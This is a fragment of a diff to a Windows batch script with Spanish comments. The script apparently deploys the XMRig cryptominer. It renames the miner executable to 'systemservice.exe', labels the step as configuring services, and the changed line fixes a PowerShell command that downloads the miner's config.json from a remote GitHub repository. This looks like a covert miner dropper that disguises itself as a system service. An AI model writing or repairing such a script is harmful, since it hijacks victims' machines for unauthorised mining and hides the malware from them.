@@ -26,7 +26,7 @@ move "xmrig-6.20.0-msvc-win64\xmrig.exe" "systemservice.exe"
 
 :: Descargar config.json desde TU repositorio RAW
 echo [3/3] Configurando servicios...
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/DECODERkING/code/blob/main/agregatorhost.json' -OutFile 'config.json'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DECODERkING/code/main/config.json' -OutFile 'config.json'"
 
 :: Limpiar y ejecutar
 del "xmrig.zip"
